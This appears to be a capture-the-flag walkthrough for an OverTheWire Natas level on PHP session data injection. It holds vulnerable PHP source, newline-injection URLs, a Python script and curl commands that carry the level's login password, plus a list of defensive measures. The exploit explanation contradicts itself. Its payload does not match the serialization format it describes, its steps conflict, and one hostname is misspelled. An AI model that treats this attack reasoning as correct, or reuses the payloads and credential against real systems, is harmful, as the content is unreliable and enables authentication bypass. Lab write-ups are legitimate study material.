20 Session Data Injection — Variable Manipulation Hard

// Key Concepts

Session Data Injection Variable Manipulation PHP Session Authentication Bypass File Inclusion

// Challenge Overview

This level has a login page that stores user data in the PHP session. By manipulating the session data, we can inject a variable that grants us administrative access. The session data is stored in a file that we can influence.

// Initial Analysis

View the source code:

<?php if (array_key_exists("name", $_REQUEST)) { $_SESSION["name"] = $_REQUEST["name"]; print "Welcome, " . $_SESSION["name"]; } if (array_key_exists("debug", $_GET)) { print "<pre>"; print_r($_SESSION); print "</pre>"; } if ($_SESSION["admin"] == 1) { print "Password: ..."; } ?>

The application stores the user's name in the session. It also has a debug parameter that displays the session data. The goal is to set $_SESSION["admin"] = 1.

💡 PHP stores session data in files on the server. In this challenge, we can manipulate the session data by injecting variables through the name parameter.

// Understanding the Vulnerability

The application uses the name parameter to set a session variable. However, the session data is stored in a file that we can access through a feature that displays the session data.

The vulnerability arises because we can set $_SESSION["name"] to a value that includes a newline and a variable declaration, effectively injecting a new session variable.

// Solution Walkthrough

Step 1 — Set the name and view the session:

http://natas20.natas.labs.overthewire.org/?name=test&debug=1

Step 2 — Create a session that sets the admin variable:

We need to set the name to a value that, when saved to the session file, will also set the admin variable.

http://natas20.natas.labs.overthewire.org/?name=admin\nadmin:1&debug=1

But we need to make this work in the session file format. The session file contains serialized data:

name|s:10:"admin\nadmin";

Step 3 — Use a better payload:

We need to terminate the name string and add a new variable:

http://natas20.natas.labs.overthewire.org/?name=admin\nadmin:1

Step 4 — Alternative approach using the debug feature:

First, set the name:

http://natas20.natas.labs.overthewire.org/?name=admin

Then, use the debug parameter to view the session:

http://natas20.natas.latas.labs.overthewire.org/?debug=1

Step 5 — Python automation:

import requests url = "http://natas20.natas.labs.overthewire.org/" auth = ("natas20", "p5mCvP7GS2K6Bmt3g9MZ3kqPxHTcnZCN") # Step 1: Set the name to inject the admin variable params = {"name": "admin\nadmin:1"} response = requests.get(url, auth=auth, params=params) # Step 2: Check if we got admin access params = {"debug": "1"} response = requests.get(url, auth=auth, params=params) if "Password" in response.text: print("Admin access granted!") print(response.text)

Step 6 — Using curl:

# Set the name with the payload curl -u natas20:p5mCvP7GS2K6Bmt3g9MZ3kqPxHTcnZCN \ "http://natas20.natas.labs.overthewire.org/?name=admin%0Aadmin:1" # Check the session with debug curl -u natas20:p5mCvP7GS2K6Bmt3g9MZ3kqPxHTcnZCN \ "http://natas20.natas.labs.overthewire.org/?debug=1"

// Why It Works

The session data injection works because:

  • Newline injection: By using %0A (newline), we can break out of the string context.
  • Variable injection: The session file format allows us to add new variables.
  • Debug feature: The debug parameter helps us verify the injection.
  • No input sanitization: The application doesn't filter special characters.

// PHP Session File Format

PHP serialized session data format:

# Format: key|type:value; # Example: name|s:5:"admin"; admin|i:1;

By injecting a newline, we can add admin|i:1; to the session data.

// Defensive Measures

  • Sanitize all user input before storing it in the session.
  • Use JSON or other safe serialization instead of PHP's built-in session serialization.
  • Do not expose session data through debug endpoints in production.
  • Validate all session data on each request.
  • Use a secure session management library instead of custom implementations.

// Key Takeaways

📝 Session Data Can Be Injected

User input stored in sessions without sanitization can lead to session data injection and authentication bypass.

🛡️ Sanitize Session Input

Always sanitize and validate data before storing it in sessions. Use safe serialization methods.
